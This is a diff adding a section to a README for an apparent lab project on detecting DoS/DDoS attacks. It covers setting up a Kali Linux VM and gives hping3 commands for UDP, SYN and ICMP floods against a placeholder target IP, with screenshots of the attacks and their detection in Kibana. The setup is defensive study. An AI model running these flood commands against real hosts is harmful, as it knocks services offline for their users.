@@ -287,4 +287,49 @@ Now open the text file and copy/paste it.
 <img width="800" alt="main_pic" src="https://github.com/AyanMK/ddos_detection/blob/main/assets/create_kibana_dashboard_2.png?raw=true">
 <img width="800" alt="main_pic" src="https://github.com/AyanMK/ddos_detection/blob/main/assets/create_kibana_dashboard_3.png?raw=true">
 
+# Setup KALI Linux & It's tools
+- Download KALI Linux for "Virtualbox"
+- Set the KALI Linux VM outeside the PfSense network. In my case it will be "NAT network" because my PfSense outside network is also "NAT network"
+- For our DoS/DDoS attack we will use "hping3" kali linux tool. It's normaly comes with kali linux.
+
+
+# Attack & Detection
+## For Generating DoS/DDoS Attacks
+- For Generating DoS/DDoS Attacks, we used "hping3".
+
+## All types of DoS/DDoS attacks
+
+<img width="800" alt="main_pic" src="https://github.com/AyanMK/ddos_detection/blob/main/assets/DDoS attack based on OSI layer.drawio.png?raw=true">
+
+- Those are the commone commands we used.
+
+UDP flood attack
+```bash
+ sudo hping3 –udp –flood -p 53 [target IP]
+```
+<img width="800" alt="main_pic" src="https://github.com/AyanMK/ddos_detection/blob/main/assets/udp_attack.png?raw=true">
+
+UDP flood attack detection
+<img width="800" alt="main_pic" src="https://github.com/AyanMK/ddos_detection/blob/main/assets/udp_attack_detection.png?raw=true">
+
+
+SYN flood attack
+```bash
+ sudo hping3 -S –flood -p 80 [target IP]
+```
+<img width="800" alt="main_pic" src="https://github.com/AyanMK/ddos_detection/blob/main/assets/syn_attack.png?raw=true">
+
+SYN flood attack detection
+<img width="800" alt="main_pic" src="https://github.com/AyanMK/ddos_detection/blob/main/assets/syn_attack_detection.png?raw=true">
+
+ICMP flood attack
+```bash
+ sudo hping3 -1 –flood [target IP]
+```
+<img width="800" alt="main_pic" src="https://github.com/AyanMK/ddos_detection/blob/main/assets/icmp_attack.png?raw=true">
+
+ICMP flood attack detection
+<img width="800" alt="main_pic" src="https://github.com/AyanMK/ddos_detection/blob/main/assets/icmp_attack_detection.png?raw=true">
+
+
 
